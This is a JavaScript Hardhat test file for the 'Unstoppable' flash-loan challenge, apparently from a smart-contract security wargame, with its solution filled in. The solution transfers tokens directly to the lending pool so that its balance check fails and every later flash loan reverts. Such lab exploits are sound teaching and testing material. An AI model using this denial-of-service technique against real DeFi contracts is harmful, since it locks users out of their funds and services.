import { ethers } from "hardhat";
import { expect } from "chai";



describe('[Challenge] Unstoppable', function () {
    this.timeout(0);

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO */
        
        const accounts = await ethers.getSigners();
        const [deployer, attacker, someUser, ...otherAccounts] = accounts;

        const tokenFactory = await ethers.getContractFactory("DamnValuableToken");
        this.token = await tokenFactory.connect(deployer).deploy();

        const poolFactory = await ethers.getContractFactory("UnstoppableLender");
        this.pool = await poolFactory.connect(deployer).deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer.address });
        await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer.address });
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_BALANCE, { from: deployer.address });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.eq(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(INITIAL_ATTACKER_BALANCE);

         // Show it's possible for anyone to take out a flash loan
         const receiverFactory = await ethers.getContractFactory("ReceiverUnstoppable");
         this.receiverContract = await receiverFactory.connect(someUser).deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const accounts = await ethers.getSigners();
        const attacker = accounts[1];

        /*
         * flashLoan method has a check "assert(poolBalance == balanceBefore);"
         * We can directly transfer tokens to pool account without calling "depositTokens"
         * method. In this way we can unqeualize poolBalance and balanceBefore(pool's Tokens)
         */
        let tx = await this.token.connect(attacker).transfer(this.pool.address, 10);
        await tx.wait();
        console.log(tx);

        let poolBalance = await this.pool.poolBalance();
        let balanceBefore = await this.token.balanceOf(this.pool.address);
        expect(poolBalance).to.be.not.eq(balanceBefore);
  });

    after(async function () {
        const accounts = await ethers.getSigners();
        const someUser = accounts[2];
        /** SUCCESS CONDITION */
        /*
        let tx = await this.receiverContract.executeFlashLoan(10, { from: someUser.address })
        await tx.wait();
        console.log(tx);
        */

        await expect(
            this.receiverContract.executeFlashLoan(10, { from: someUser.address })
        ).to.be.reverted;
    });
});
